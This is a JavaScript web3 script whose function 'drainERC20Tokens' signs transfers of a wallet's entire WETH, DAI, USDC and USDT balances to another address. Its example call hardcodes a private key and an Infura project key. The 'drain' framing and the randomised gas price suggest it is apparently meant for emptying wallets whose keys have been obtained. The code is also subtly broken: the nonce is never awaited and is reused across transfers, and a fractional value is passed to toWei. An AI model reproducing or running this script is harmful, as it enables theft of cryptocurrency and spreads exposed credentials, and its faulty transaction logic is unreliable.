const Web3 = require('web3');

const web3 = new Web3('https://mainnet.infura.io/v3/ca6cb19afea34c50803262483da42745');

async function drainERC20Tokens(walletAddress, privateKey, recipientAddress) {
    const tokenList = [
        '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // WETH
        '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
        '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48', // USDC
        '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
    ];

    for (const tokenAddress of tokenList) {
        const tokenAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint amount) returns (bool)"
        ];
        const tokenContract = new web3.eth.Contract(tokenAbi, tokenAddress);
        const balance = await tokenContract.methods.balanceOf(walletAddress).call();

        if (balance > 0) {
            const data = tokenContract.methods.transfer(recipientAddress, balance).encodeABI();
            const gasPrice = web3.utils.toWei(Math.random() * 100 + 30, 'gwei'); // Vary gas price
            const gasLimit = 200000; // Estimated gas limit for token transfer

            const tx = {
                from: walletAddress,
                to: tokenAddress,
                data: data,
                gas: gasLimit,
                gasPrice: gasPrice,
                nonce: web3.eth.getTransactionCount(walletAddress),
            };

            const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
            const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
            console.log(`Transaction successful with hash: ${receipt.transactionHash}`);
        }
    }
}

// Example usage
drainERC20Tokens('0x8136c3B07725C2bb79973F7D87b3Df922F338F1D', 'd4d5037d5877fb38ecc3c513ccaef4860b27d4eb6db43375b5185154027700ee', '0xYourRecipientAddress');
